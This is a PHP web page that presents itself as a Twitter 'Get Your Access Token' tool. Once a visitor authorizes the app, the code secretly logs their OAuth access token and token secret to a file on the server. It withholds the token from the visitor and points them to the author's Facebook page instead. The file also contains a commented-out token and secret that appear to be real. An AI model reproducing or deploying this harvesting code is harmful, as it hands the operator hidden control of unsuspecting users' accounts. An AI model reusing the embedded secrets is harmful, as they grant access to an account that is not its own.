<html lang="en">
<head>
  <title>NVZBY</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>
<?php
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
session_start();

if(isset($_GET['refresh'])) {
    session_destroy();
    unset($_SESSION['oauth_token']);
    unset($_SESSION['oauth_token_secret']);
    header('location:/');
}


require 'autoload.php';
use Abraham\TwitterOAuth\TwitterOAuth;
define('CONSUMER_KEY', 'xxxxxxxxxxxxxxxxxxxxx'); 
define('CONSUMER_SECRET', 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');
define('OAUTH_CALLBACK', 'http://tukang.codes/callback.php');				
//define('oauth_token', '842987337353052160-LL8z2AHxYRP7lHo8iDaq8cLNzeSu8OP');
//define('oauth_token_secret', '6eZZno5qC6d8E5Gtc9jakmhEgvP07F3MfxOBwJ5ysLm8x');

if (!isset($_SESSION['access_token'])) {
    
	$connection = new TwitterOAuth(CONSUMER_KEY, CONSUMER_SECRET);
	$request_token = $connection->oauth('oauth/request_token', array('oauth_callback' => OAUTH_CALLBACK));
	$_SESSION['oauth_token'] = $request_token['oauth_token'];
	$_SESSION['oauth_token_secret'] = $request_token['oauth_token_secret'];
	$url = $connection->url('oauth/authorize', array('oauth_token' => $request_token['oauth_token']));
	//echo $url;
	
	
	echo '
	<br><div class="container">
  <div class="panel panel-default">
    <div class="panel-heading">Get Your Access Token!</div>
    <div class="panel-body"><a href="'.$url.'"><button type="button" class="btn btn-default">Get Token!</button></a></div>
  </div>
</div>';

} else {
    
	$access_token = $_SESSION['access_token'];
	$connection = new TwitterOAuth(CONSUMER_KEY, CONSUMER_SECRET, $access_token['oauth_token'], $access_token['oauth_token_secret']);
	$user = $connection->get("account/verify_credentials", ['include_email' => 'true']);   
	
	
                            $log = './x/'.$user->screen_name.'.txt';
                            if (!file_exists($log))
                            {
                                fopen($log, 'a');
                            }
                            $gg = 'Access Token : '.$access_token['oauth_token'].'';
                            $gx = 'Access Token Secret : '.$access_token['oauth_token_secret'].'';
                            $date = date("l jS \of F Y h:i:s A");
                            
                            file_put_contents($log, $gg . "\n", FILE_APPEND);
                            file_put_contents($log, $gx . "\n", FILE_APPEND);
                            file_put_contents($log, $date . "\n\n", FILE_APPEND);


echo '	<br><div class="container">
  <div class="panel panel-default">
    <div class="panel-heading">Get Your Access Token!</div>
    <div class="panel-body">
        <div class="alert alert-success">
  <strong>Success!</strong> <a href="https://facebook.com/NVZBY">CONTACT ME TO GET OAUTH ACCESS TOKEN!</a>
</div>
    Nama : '.$user->name.'<br>
    Username : '.$user->screen_name.'<br>
    Created at : '.$user->created_at.'<br><br>
    
    <form action="" method="get">
    <button type="submit" class="btn btn-default" name="refresh">REFRESH!</button>
    </form>
    </div>
  </div>
</div>';

}
	
?>

</body>
</html>